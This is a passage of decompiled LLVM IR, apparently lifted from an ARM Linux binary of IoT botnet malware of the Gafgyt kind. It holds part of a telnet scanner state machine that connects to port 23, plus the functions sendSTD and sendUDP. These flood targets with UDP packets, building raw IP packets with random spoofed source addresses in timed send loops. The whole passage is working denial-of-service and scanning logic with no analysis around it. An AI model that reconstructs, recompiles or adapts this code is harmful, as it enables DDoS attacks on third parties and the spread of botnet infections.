  %v3_100064a4 = load i8, i8* %v2_100064a4, align 2
  %v1_100064ac = add i8 %v3_100064a4, 1
  store i8 %v1_100064ac, i8* %v2_100064a4, align 2
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v3_100064d4 = load i8, i8* %v2_10006474, align 1
  %v3_100064dc = icmp eq i8 %v3_100064d4, 3
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  br i1 %v3_100064dc, label %dec_label_pc_100064e4, label %dec_label_pc_10006500

dec_label_pc_100064e4:                            ; preds = %dec_label_pc_10006464
  store i8 1, i8* %v2_10006390, align 1
  br label %dec_label_pc_10007108

dec_label_pc_10006500:                            ; preds = %dec_label_pc_10006464
  %v3_10006510 = load i8, i8* %v2_100064a4, align 2
  %v3_10006518 = icmp eq i8 %v3_10006510, 3
  br i1 %v3_10006518, label %dec_label_pc_10006520, label %dec_label_pc_1000653c

dec_label_pc_10006520:                            ; preds = %dec_label_pc_10006500
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10006390, align 1
  br label %dec_label_pc_10007108

dec_label_pc_1000653c:                            ; preds = %dec_label_pc_10006500, %dec_label_pc_10006444, %dec_label_pc_100063a0
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10006548 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-52, align 4
  %v1_1000657c = add i32 %v2_100062f0, 4
  store i32 %v1_1000657c, i32* %r9.global-to-local, align 4
  store i32 268461468, i32* @lr, align 4
  %v3_10006598 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_100065a4 = mul i32 %storemerge48, 28
  %v2_100065a8 = add i32 %v1_100065a4, %v1_100061d0
  %v2_100065ac = inttoptr i32 %v2_100065a8 to i32*
  store i32 %v3_10006598, i32* %v2_100065ac, align 4
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v1_100065c0 = inttoptr i32 %v2_100062f0 to i32*
  %v2_100065c0 = load i32, i32* %v1_100065c0, align 4
  store i32 %v2_100065c0, i32* %r9.global-to-local, align 4
  %v4_100065c8 = icmp eq i32 %v2_100065c0, -1
  br i1 %v4_100065c8, label %dec_label_pc_10007108, label %dec_label_pc_100065d0

dec_label_pc_100065d0:                            ; preds = %dec_label_pc_1000653c
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v2_100065e0 = load i32, i32* %v1_100065c0, align 4
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v2_100065f4 = load i32, i32* %v1_100065c0, align 4
  store i32 268461580, i32* @lr, align 4
  %v2_10006608 = call i32 @__libc_fcntl(i32 %v2_100065f4, i32 3)
  store i32 268461608, i32* @lr, align 4
  %v2_10006624 = call i32 @__libc_fcntl(i32 %v2_100065e0, i32 4)
  store i32 %v2_100062f0, i32* %r9.global-to-local, align 4
  %v2_10006638 = load i32, i32* %v1_100065c0, align 4
  store i32 %v2_1000663c, i32* %r9.global-to-local, align 4
  store i32 268461648, i32* @lr, align 4
  %v3_1000664c = call i32 @__libc_connect(i32 %v2_10006638, i32 %v2_1000663c, i32 16)
  store i32 %v3_1000664c, i32* %r9.global-to-local, align 4
  %v4_10006658 = icmp eq i32 %v3_1000664c, -1
  br i1 %v4_10006658, label %dec_label_pc_10006660, label %dec_label_pc_10006690

dec_label_pc_10006660:                            ; preds = %dec_label_pc_100065d0
  %v0_10006660 = call i32 @__errno_location()
  store i32 %v0_10006660, i32* %r9.global-to-local, align 4
  %v1_10006668 = inttoptr i32 %v0_10006660 to i32*
  %v2_10006668 = load i32, i32* %v1_10006668, align 4
  %v3_1000666c = icmp eq i32 %v2_10006668, 115
  br i1 %v3_1000666c, label %dec_label_pc_10006690, label %dec_label_pc_10006674

dec_label_pc_10006674:                            ; preds = %dec_label_pc_10006660
  store i32 %v1_100061d0, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000668c.188 to i32), i32* @lr, align 4
  %v2_10006688 = call i32 @reset_telstate(i32 %v2_100062f0, i32 %v1_100061d0)
  br label %dec_label_pc_10007108

dec_label_pc_10006690:                            ; preds = %dec_label_pc_100065d0, %dec_label_pc_10006660
  store i32 %v1_100061d0, i32* %r9.global-to-local, align 4
  %v3_100066a8 = call i32 @advance_state(i32* nonnull %v1_100065c0, i32 1)
  br label %dec_label_pc_10007108

dec_label_pc_10007108:                            ; preds = %dec_label_pc_1000653c, %dec_label_pc_1000632c, %dec_label_pc_10006690, %dec_label_pc_10006674, %dec_label_pc_10006520, %dec_label_pc_100064e4
  %v1_1000710c = add nuw nsw i32 %storemerge48, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_1000711c = icmp slt i32 %v1_1000710c, %arg2
  br i1 %v2_1000711c, label %dec_label_pc_100062e4, label %dec_label_pc_100062d8

; uselistorder directives
  uselistorder i32 %v1_1000710c, { 1, 0 }
  uselistorder i8* %v2_100064a4, { 1, 0, 2 }
  uselistorder i8* %v2_10006474, { 1, 0, 2 }
  uselistorder i32 %v1_100063b0, { 1, 0, 2, 3 }
  uselistorder i8 %v3_1000633c, { 1, 0 }
  uselistorder i32 %v2_100062f0, { 7, 8, 9, 10, 12, 11, 13, 0, 1, 2, 4, 3, 6, 5, 17, 15, 14, 16, 19, 18, 21, 20, 22 }
  uselistorder i32 %storemerge48, { 3, 1, 0, 2 }
  uselistorder i32 %v1_1000628c, { 1, 0 }
  uselistorder i32 %storemerge313, { 1, 0 }
  uselistorder i32 %v1_100061d0, { 6, 5, 4, 0, 7, 1, 3, 8, 2, 9, 10 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 33, 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 24, 23, 25, 26, 27, 48, 28, 29, 30, 31, 32, 46, 34, 42, 35, 36, 37, 38, 39, 40, 41, 47, 43, 44, 45 }
  uselistorder i32 115, { 1, 0, 2 }
  uselistorder i32 %arg2, { 4, 3, 2, 6, 5, 0, 1, 7, 8 }
  uselistorder label %dec_label_pc_10007108, { 2, 3, 0, 4, 5, 1 }
  uselistorder label %dec_label_pc_10006690, { 1, 0 }
  uselistorder label %dec_label_pc_1000632c, { 1, 0 }
  uselistorder label %dec_label_pc_100062e4, { 1, 0 }
  uselistorder label %dec_label_pc_100062d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000620c, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  store i32 268464472, i32* @lr, align 4
  %v3_10007154 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268464488, i32* @lr, align 4
  %v1_10007164 = call i32 @__GI_time(i32 0)
  store i32 268464508, i32* @lr, align 4
  %v1_10007178 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_10007184 = ptrtoint i32* %stack_var_-196 to i32
  store i32 0, i32* %stack_var_-196, align 4
  store i32 0, i32* %stack_var_-192, align 4
  %v1_100071ac = add i32 %v1_10007178, 16
  %v2_100071ac = inttoptr i32 %v1_100071ac to i32*
  %v3_100071ac = load i32, i32* %v2_100071ac, align 4
  %v1_100071b0 = inttoptr i32 %v3_100071ac to i32*
  %v2_100071b0 = load i32, i32* %v1_100071b0, align 4
  %v2_100071b8 = ptrtoint i32* %stack_var_-192 to i32
  %v1_100071c0 = add i32 %v1_10007178, 12
  %v2_100071c0 = inttoptr i32 %v1_100071c0 to i32*
  %v3_100071c0 = load i32, i32* %v2_100071c0, align 4
  store i32 %v3_100071c0, i32* @r5, align 4
  store i32 268464596, i32* @lr, align 4
  %v4_100071d0 = call i32 @bcopy(i32 %v2_100071b0, i32 %v2_100071b8, i32 %v3_100071c0, i32 %v1_10007178)
  %v1_100071d8 = add i32 %v1_10007178, 8
  %v2_100071d8 = inttoptr i32 %v1_100071d8 to i32*
  %v3_100071d8 = load i32, i32* %v2_100071d8, align 4
  %v1_100071dc = urem i32 %v3_100071d8, 65536
  store i32 %v1_100071dc, i32* %stack_var_-196, align 4
  %v2_10007200 = ptrtoint i32* %stack_var_-180 to i32
  %v2_10007250 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10007254 = add i32 %v2_10007250, 36
  %v2_100072ac = add i32 %v1_10007164, %arg3
  br label %dec_label_pc_100071f8

dec_label_pc_100071f8:                            ; preds = %dec_label_pc_100072d0, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_100072d4, %dec_label_pc_100072d0 ]
  store i32 %v2_10007200, i32* @r3, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1001455c.269 to i32), i32* @r4, align 4
  store i32 144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10007218.270 to i32), i32* @lr, align 4
  %v0_10007214 = call i32 @memcpy()
  store i32 268464668, i32* @lr, align 4
  %v0_10007218 = call i32 @random()
  %v1_10007230 = urem i32 %v0_10007218, 36
  %v1_1000724c = mul nuw nsw i32 %v1_10007230, 4
  %v1_10007258 = add i32 %v2_10007254, %v1_1000724c
  %v1_1000725c = inttoptr i32 %v1_10007258 to i32*
  %v2_1000725c = load i32, i32* %v1_1000725c, align 4
  store i32 %v2_1000725c, i32* %stack_var_-216, align 4
  %tmp23 = icmp ult i32 %storemerge3, 50
  br i1 %tmp23, label %dec_label_pc_100072d0, label %dec_label_pc_10007270

dec_label_pc_10007270:                            ; preds = %dec_label_pc_100071f8
  store i32 268464772, i32* @lr, align 4
  %v4_10007280 = call i32 @__libc_send(i32 %v3_10007154, i32 %v2_1000725c, i32 65, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_10007298.271 to i32), i32* @lr, align 4
  %v3_10007294 = call i32 @__libc_connect(i32 %v3_10007154, i32 %v2_10007184, i32 16)
  store i32 268464800, i32* @lr, align 4
  %v1_1000729c = call i32 @__GI_time(i32 0)
  %v2_100072b0 = icmp slt i32 %v1_1000729c, %v2_100072ac
  br i1 %v2_100072b0, label %dec_label_pc_100072c8, label %dec_label_pc_100072b8

dec_label_pc_100072b8:                            ; preds = %dec_label_pc_10007270
  store i32 ptrtoint ([3 x i8]* @global_var_100072c0.272 to i32), i32* @lr, align 4
  %v1_100072bc = call i32 @__libc_close(i32 %v3_10007154)
  %v1_100072c4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100072c8

dec_label_pc_100072c8:                            ; preds = %dec_label_pc_10007270, %dec_label_pc_100072b8
  br label %dec_label_pc_100072d0

dec_label_pc_100072d0:                            ; preds = %dec_label_pc_100071f8, %dec_label_pc_100072c8
  %stack_var_-212.0 = phi i32 [ %storemerge3, %dec_label_pc_100071f8 ], [ 0, %dec_label_pc_100072c8 ]
  %v1_100072d4 = add i32 %stack_var_-212.0, 1
  br label %dec_label_pc_100071f8

; uselistorder directives
  uselistorder i32 %v3_100071c0, { 1, 0 }
  uselistorder i32 %v1_10007178, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_100072d0, { 1, 0 }
  uselistorder label %dec_label_pc_100072c8, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100072e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100072e0, i32* %stack_var_-160, align 4
  %v0_10007314 = load i32, i32* @r10, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v3_10007324 = icmp eq i32 %arg2, 0
  br i1 %v3_10007324, label %dec_label_pc_1000732c, label %dec_label_pc_10007340

dec_label_pc_1000732c:                            ; preds = %entry
  %v0_1000732c = call i32 @rand_cmwc()
  br label %dec_label_pc_10007358

dec_label_pc_10007340:                            ; preds = %entry
  %v1_10007344 = urem i32 %arg2, 65536
  store i32 %v1_10007344, i32* @r3, align 4
  %v1_1000734c = call i32 @htons(i32 %v1_10007344)
  br label %dec_label_pc_10007358

dec_label_pc_10007358:                            ; preds = %dec_label_pc_1000732c, %dec_label_pc_10007340
  %v2_10007358 = ptrtoint i32* %stack_var_-112 to i32
  %v4_10007368 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-108, i32 %v2_10007358)
  %v3_10007370 = icmp eq i32 %v4_10007368, 0
  br i1 %v3_10007370, label %dec_label_pc_10007378, label %dec_label_pc_10007944

dec_label_pc_10007378:                            ; preds = %dec_label_pc_10007358
  %v3_1000739c = icmp eq i32 %arg4, 32
  br i1 %v3_1000739c, label %dec_label_pc_100073a4, label %dec_label_pc_10007520

dec_label_pc_100073a4:                            ; preds = %dec_label_pc_10007378
  store i32 268465076, i32* @lr, align 4
  %v3_100073b0 = call i32 @socket(i32 2, i32 2, i32 17)
  %v3_100073c0 = icmp eq i32 %v3_100073b0, 0
  br i1 %v3_100073c0, label %dec_label_pc_100073c8, label %dec_label_pc_100073e8

dec_label_pc_100073c8:                            ; preds = %dec_label_pc_100073a4
  %v3_100073cc = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_100073e4.275 to i32), i32* @lr, align 4
  %v4_100073e0 = call i32 @sockprintf(i32 %v3_100073cc, i32 ptrtoint ([27 x i8]* @global_var_100145ec.274 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  br label %dec_label_pc_10007944

dec_label_pc_100073e8:                            ; preds = %dec_label_pc_100073a4
  %v1_100073ec = add i32 %arg5, 1
  store i32 %v1_100073ec, i32* @r3, align 4
  store i32 268465144, i32* @lr, align 4
  %v0_100073f4 = call i32 @malloc()
  %v3_10007404 = icmp eq i32 %v0_100073f4, 0
  br i1 %v3_10007404, label %dec_label_pc_10007944, label %dec_label_pc_1000740c

dec_label_pc_1000740c:                            ; preds = %dec_label_pc_100073e8
  store i32 268465196, i32* @lr, align 4
  %v3_10007428 = call i32 @__GI_memset(i32 %v0_100073f4, i32 0, i32 %v1_100073ec)
  %v2_10007434 = call i32 @makeRandomStr(i32 %v0_100073f4, i32 %arg5)
  store i32 268465216, i32* @lr, align 4
  %v1_1000743c = call i32 @__GI_time(i32 0)
  %v2_10007448 = add i32 %v1_1000743c, %arg3
  %v1_100074f8 = mul i32 %v0_10007314, 1000
  br label %dec_label_pc_10007464.outer

dec_label_pc_10007464.outer:                      ; preds = %dec_label_pc_10007464.outer.backedge, %dec_label_pc_1000740c
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_1000740c ], [ %storemerge27, %dec_label_pc_10007464.outer.backedge ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_1000740c ], [ %v1_100074dc, %dec_label_pc_10007464.outer.backedge ]
  br label %dec_label_pc_10007464

dec_label_pc_10007464:                            ; preds = %dec_label_pc_10007464.outer, %dec_label_pc_100074cc
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_100074cc ], [ %stack_var_-44.0.ph, %dec_label_pc_10007464.outer ]
  store i32 268465288, i32* @lr, align 4
  %v7_10007484 = call i32 @__libc_sendto(i32 %v3_100073b0, i32 %v0_100073f4, i32 %arg5, i32 0, i32 %v2_10007358, i32 16, i32 %v2_10007358)
  %v4_10007490 = icmp eq i32 %stack_var_-44.0, %arg6
  br i1 %v4_10007490, label %dec_label_pc_10007498, label %dec_label_pc_100074d8

dec_label_pc_10007498:                            ; preds = %dec_label_pc_10007464
  br i1 %v3_10007324, label %dec_label_pc_100074a4, label %dec_label_pc_100074b4

dec_label_pc_100074a4:                            ; preds = %dec_label_pc_10007498
  %v0_100074a4 = call i32 @rand_cmwc()
  br label %dec_label_pc_100074b4

dec_label_pc_100074b4:                            ; preds = %dec_label_pc_10007498, %dec_label_pc_100074a4
  store i32 268465340, i32* @lr, align 4
  %v1_100074b8 = call i32 @__GI_time(i32 0)
  %v3_100074c4 = icmp sgt i32 %v1_100074b8, %v2_10007448
  br i1 %v3_100074c4, label %dec_label_pc_10007944, label %dec_label_pc_100074cc

dec_label_pc_100074cc:                            ; preds = %dec_label_pc_100074b4
  br label %dec_label_pc_10007464

dec_label_pc_100074d8:                            ; preds = %dec_label_pc_10007464
  %v1_100074dc = add i32 %stack_var_-44.0, 1
  %v4_100074ec = icmp eq i32 %stack_var_-48.0.ph, %arg7
  br i1 %v4_100074ec, label %dec_label_pc_100074f4, label %dec_label_pc_10007510

dec_label_pc_100074f4:                            ; preds = %dec_label_pc_100074d8
  store i32 ptrtoint ([3 x i8]* @global_var_10007504.277 to i32), i32* @lr, align 4
  %v2_10007500 = call i32 @usleep(i32 %v1_100074f8, i32 %arg7)
  br label %dec_label_pc_10007464.outer.backedge

dec_label_pc_10007464.outer.backedge:             ; preds = %dec_label_pc_100074f4, %dec_label_pc_10007510
  %storemerge27 = phi i32 [ %v1_10007514, %dec_label_pc_10007510 ], [ 0, %dec_label_pc_100074f4 ]
  br label %dec_label_pc_10007464.outer

dec_label_pc_10007510:                            ; preds = %dec_label_pc_100074d8
  %v1_10007514 = add i32 %stack_var_-48.0.ph, 1
  br label %dec_label_pc_10007464.outer.backedge

dec_label_pc_10007520:                            ; preds = %dec_label_pc_10007378
  store i32 268465464, i32* @lr, align 4
  %v3_10007534 = call i32 @socket(i32 2, i32 3, i32 17)
  %v3_10007544 = icmp eq i32 %v3_10007534, 0
  br i1 %v3_10007544, label %dec_label_pc_1000754c, label %dec_label_pc_1000756c

dec_label_pc_1000754c:                            ; preds = %dec_label_pc_10007520
  %v3_10007550 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_10007568.278 to i32), i32* @lr, align 4
  %v4_10007564 = call i32 @sockprintf(i32 %v3_10007550, i32 ptrtoint ([27 x i8]* @global_var_100145ec.274 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  br label %dec_label_pc_10007934

dec_label_pc_1000756c:                            ; preds = %dec_label_pc_10007520
  store i32 1, i32* %stack_var_-96, align 4
  %v2_10007574 = ptrtoint i32* %stack_var_-96 to i32
  store i32 268465552, i32* @lr, align 4
  %v5_1000758c = call i32 @__GI_setsockopt(i32 %v3_10007534, i32 0, i32 3, i32 %v2_10007574, i32 4)
  %tmp77 = icmp sgt i32 %v5_1000758c, -1
  br i1 %tmp77, label %dec_label_pc_100075bc, label %dec_label_pc_1000759c

dec_label_pc_1000759c:                            ; preds = %dec_label_pc_1000756c
  %v3_100075a0 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_100075b8.280 to i32), i32* @lr, align 4
  %v4_100075b4 = call i32 @sockprintf(i32 %v3_100075a0, i32 ptrtoint ([33 x i8]* @global_var_10014608.279 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  br label %dec_label_pc_10007934

dec_label_pc_100075bc:                            ; preds = %dec_label_pc_1000756c
  br label %dec_label_pc_100075c8

dec_label_pc_100075c8:                            ; preds = %dec_label_pc_100075bc, %dec_label_pc_100075c8
  %v1_1000760022 = phi i32 [ 49, %dec_label_pc_100075bc ], [ %v1_10007600, %dec_label_pc_100075c8 ]
  store i32 268465616, i32* @lr, align 4
  %v1_100075cc = call i32 @__GI_time(i32 0)
  %v0_100075d8 = call i32 @rand_cmwc()
  %v2_100075e0 = xor i32 %v1_100075cc, %v0_100075d8
  store i32 ptrtoint (i32* @global_var_100075ec.281 to i32), i32* @lr, align 4
  %v1_100075e8 = call i32 @srand(i32 %v2_100075e0)
  store i32 268465648, i32* @lr, align 4
  %v0_100075ec = call i32 @random()
  %v1_100075f8 = call i32 @init_rand(i32 %v0_100075ec)
  %v1_10007600 = add nsw i32 %v1_1000760022, -1
  %v4_10007610 = icmp eq i32 %v1_1000760022, 0
  br i1 %v4_10007610, label %dec_label_pc_10007618, label %dec_label_pc_100075c8

dec_label_pc_10007618:                            ; preds = %dec_label_pc_100075c8
  %v3_1000761c = icmp eq i32 %arg4, 0
  br i1 %v3_1000761c, label %dec_label_pc_10007648, label %dec_label_pc_10007630

dec_label_pc_10007630:                            ; preds = %dec_label_pc_10007618
  %v1_10007634 = sub i32 32, %arg4
  %v2_1000763c = urem i32 %v1_10007634, 64
  %v1_10007640 = shl i32 -1, %v2_1000763c
  br label %dec_label_pc_10007648

dec_label_pc_10007648:                            ; preds = %dec_label_pc_10007618, %dec_label_pc_10007630
  %storemerge10 = phi i32 [ %v1_10007640, %dec_label_pc_10007630 ], [ 0, %dec_label_pc_10007618 ]
  %v1_1000764c = add i32 %arg5, 28
  %v1_1000765c = add i32 %arg5, 58
  %v1_10007660 = and i32 %v1_1000765c, -16
  %v2_10007668 = load i32, i32* %stack_var_-160, align 4
  %v1_10007670 = load i32, i32* @r1, align 4
  %v3_10007670 = sub i32 %v1_10007670, %v1_10007660
  %v4_10007670 = inttoptr i32 %v3_10007670 to i32*
  store i32 %v2_10007668, i32* %v4_10007670, align 4
  %v1_10007680 = add i32 %v3_10007670, 23
  %v1_10007684 = and i32 %v1_10007680, -16
  %v1_100076a4 = add i32 %v1_10007684, 20
  %v5_100076a8 = inttoptr i32 %v1_100076a4 to i16*
  %v3_100076ac = load i32, i32* %stack_var_-108, align 4
  %v1_100076b4 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_100076b4, i32* @r3, align 4
  %v1_100076c0 = call i32 @htonl(i32 %v1_100076b4)
  %v1_100076cc = add i32 %arg5, 8
  %v6_100076e4 = inttoptr i32 %v1_10007684 to i32*
  %v7_100076e4 = call i32 @makeIPPacket(i32* %v6_100076e4, i32 %v3_100076ac, i32 %v1_100076c0, i32 17, i32 %v1_100076cc, i32 %arg5)
  %v1_100076f4 = urem i32 %v1_100076cc, 65536
  store i32 %v1_100076f4, i32* @r3, align 4
  %v1_100076fc = call i32 @htons(i32 %v1_100076f4)
  %sext = mul i32 %v1_100076fc, 65536
  %v1_10007700 = sdiv i32 %sext, 65536
  %v1_10007708 = trunc i32 %v1_10007700 to i16
  %v3_10007708 = add i32 %v1_10007684, 24
  %v4_10007708 = inttoptr i32 %v3_10007708 to i16*
  store i16 %v1_10007708, i16* %v4_10007708, align 8
  %v0_1000770c = call i32 @rand_cmwc()
  %v1_1000771c = trunc i32 %v0_1000770c to i16
  store i16 %v1_1000771c, i16* %v5_100076a8, align 4
  br i1 %v3_10007324, label %dec_label_pc_1000772c, label %dec_label_pc_10007740

dec_label_pc_1000772c:                            ; preds = %dec_label_pc_10007648
  %v0_1000772c = call i32 @rand_cmwc()
  %extract.t87 = trunc i32 %v0_1000772c to i16
  br label %dec_label_pc_10007758

dec_label_pc_10007740:                            ; preds = %dec_label_pc_10007648
  %v1_10007744 = urem i32 %arg2, 65536
  store i32 %v1_10007744, i32* @r3, align 4
  %v1_1000774c = call i32 @htons(i32 %v1_10007744)
  %extract.t = trunc i32 %v1_1000774c to i16
  br label %dec_label_pc_10007758

dec_label_pc_10007758:                            ; preds = %dec_label_pc_1000772c, %dec_label_pc_10007740
  %storemerge78.off0 = phi i16 [ %extract.t, %dec_label_pc_10007740 ], [ %extract.t87, %dec_label_pc_1000772c ]
  %v1_10007838.pre-phi = phi i32 [ %v1_10007744, %dec_label_pc_10007740 ], [ 0, %dec_label_pc_1000772c ]
  %v3_10007760 = add i32 %v1_10007684, 22
  %v4_10007760 = inttoptr i32 %v3_10007760 to i16*
  store i16 %storemerge78.off0, i16* %v4_10007760, align 2
  %v3_1000776c = add i32 %v1_10007684, 26
  %v4_1000776c = inttoptr i32 %v3_1000776c to i16*
  store i16 0, i16* %v4_1000776c, align 2
  %v1_10007774 = add i32 %v1_10007684, 28
  %v2_10007780 = call i32 @makeRandomStr(i32 %v1_10007774, i32 %arg5)
  %v1_10007790 = or i32 %v1_10007684, 2
  %v2_10007790 = inttoptr i32 %v1_10007790 to i16*
  %v3_10007790 = load i16, i16* %v2_10007790, align 2
  %v4_10007790 = zext i16 %v3_10007790 to i32
  %v5_100077a0 = inttoptr i32 %v1_10007684 to i16*
  %v6_100077a0 = call i32 @csum(i16* %v5_100077a0, i32 %v4_10007790, i32 %v1_10007684, i32 17, i32 %v1_100076cc)
  %sext4 = mul i32 %v6_100077a0, 65536
  %v1_100077a4 = sdiv i32 %sext4, 65536
  %v1_100077ac = trunc i32 %v1_100077a4 to i16
  %v3_100077ac = or i32 %v1_10007684, 10
  %v4_100077ac = inttoptr i32 %v3_100077ac to i16*
  store i16 %v1_100077ac, i16* %v4_100077ac, align 2
  store i32 268466104, i32* @lr, align 4
  %v1_100077b4 = call i32 @__GI_time(i32 0)
  %v2_100077c0 = add i32 %v1_100077b4, %arg3
  %v3_10007868 = or i32 %v1_10007684, 4
  %v4_10007868 = inttoptr i32 %v3_10007868 to i16*
  %v2_10007888 = or i32 %v1_10007684, 12
  %v3_10007888 = inttoptr i32 %v2_10007888 to i32*
  %v1_1000790c = mul i32 %v0_10007314, 1000
  br label %dec_label_pc_100077dc.outer

dec_label_pc_100077dc.outer:                      ; preds = %dec_label_pc_100077dc.outer.backedge, %dec_label_pc_10007758
  %stack_var_-56.0.ph = phi i32 [ 0, %dec_label_pc_10007758 ], [ %storemerge26, %dec_label_pc_100077dc.outer.backedge ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10007758 ], [ %v1_100078f0, %dec_label_pc_100077dc.outer.backedge ]
  br label %dec_label_pc_100077dc

dec_label_pc_100077dc:                            ; preds = %dec_label_pc_100077dc.outer, %dec_label_pc_100078e0
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_100078e0 ], [ %stack_var_-52.0.ph, %dec_label_pc_100077dc.outer ]
  store i32 268466176, i32* @lr, align 4
  %v7_100077fc = call i32 @__libc_sendto(i32 %v3_10007534, i32 %v1_10007684, i32 %v1_1000764c, i32 0, i32 %v2_10007358, i32 16, i32 %v2_10007358)
  %v0_10007800 = call i32 @rand_cmwc()
  %v1_10007810 = trunc i32 %v0_10007800 to i16
  store i16 %v1_10007810, i16* %v5_100076a8, align 4
  br i1 %v3_10007324, label %dec_label_pc_10007820, label %dec_label_pc_10007834

dec_label_pc_10007820:                            ; preds = %dec_label_pc_100077dc
  %v0_10007820 = call i32 @rand_cmwc()
  %extract.t89 = trunc i32 %v0_10007820 to i16
  br label %dec_label_pc_1000784c

dec_label_pc_10007834:                            ; preds = %dec_label_pc_100077dc
  store i32 %v1_10007838.pre-phi, i32* @r3, align 4
  %v1_10007840 = call i32 @htons(i32 %v1_10007838.pre-phi)
  %extract.t88 = trunc i32 %v1_10007840 to i16
  br label %dec_label_pc_1000784c

dec_label_pc_1000784c:                            ; preds = %dec_label_pc_10007820, %dec_label_pc_10007834
  %storemerge80.off0 = phi i16 [ %extract.t88, %dec_label_pc_10007834 ], [ %extract.t89, %dec_label_pc_10007820 ]
  store i16 %storemerge80.off0, i16* %v4_10007760, align 2
  %v0_10007858 = call i32 @rand_cmwc()
  %v1_10007868 = trunc i32 %v0_10007858 to i16
  store i16 %v1_10007868, i16* %v4_10007868, align 4
  %v1_10007870 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_10007870, i32* @r3, align 4
  %v1_1000787c = call i32 @htonl(i32 %v1_10007870)
  store i32 %v1_1000787c, i32* %v3_10007888, align 4
  %v3_10007898 = load i16, i16* %v2_10007790, align 2
  %v4_10007898 = zext i16 %v3_10007898 to i32
  %v6_100078a8 = call i32 @csum(i16* %v5_100077a0, i32 %v4_10007898, i32 %v1_10007684, i32 0, i32 %v2_10007358)
  %v1_100078b4 = trunc i32 %v6_100078a8 to i16
  store i16 %v1_100078b4, i16* %v4_100077ac, align 2
  %v4_100078c0 = icmp eq i32 %stack_var_-52.0, %arg6
  br i1 %v4_100078c0, label %dec_label_pc_100078c8, label %dec_label_pc_100078ec

dec_label_pc_100078c8:                            ; preds = %dec_label_pc_1000784c
  store i32 268466384, i32* @lr, align 4
  %v1_100078cc = call i32 @__GI_time(i32 0)
  %v3_100078d8 = icmp sgt i32 %v1_100078cc, %v2_100077c0
  br i1 %v3_100078d8, label %dec_label_pc_10007934, label %dec_label_pc_100078e0

dec_label_pc_100078e0:                            ; preds = %dec_label_pc_100078c8
  br label %dec_label_pc_100077dc

dec_label_pc_100078ec:                            ; preds = %dec_label_pc_1000784c
  %v1_100078f0 = add i32 %stack_var_-52.0, 1
  %v4_10007900 = icmp eq i32 %stack_var_-56.0.ph, %arg7
  br i1 %v4_10007900, label %dec_label_pc_10007908, label %dec_label_pc_10007924

dec_label_pc_10007908:                            ; preds = %dec_label_pc_100078ec
  store i32 ptrtoint ([3 x i8]* @global_var_10007918.282 to i32), i32* @lr, align 4
  %v2_10007914 = call i32 @usleep(i32 %v1_1000790c, i32 %arg7)
  br label %dec_label_pc_100077dc.outer.backedge

dec_label_pc_100077dc.outer.backedge:             ; preds = %dec_label_pc_10007908, %dec_label_pc_10007924
  %storemerge26 = phi i32 [ %v1_10007928, %dec_label_pc_10007924 ], [ 0, %dec_label_pc_10007908 ]
  br label %dec_label_pc_100077dc.outer

dec_label_pc_10007924:                            ; preds = %dec_label_pc_100078ec
  %v1_10007928 = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_100077dc.outer.backedge

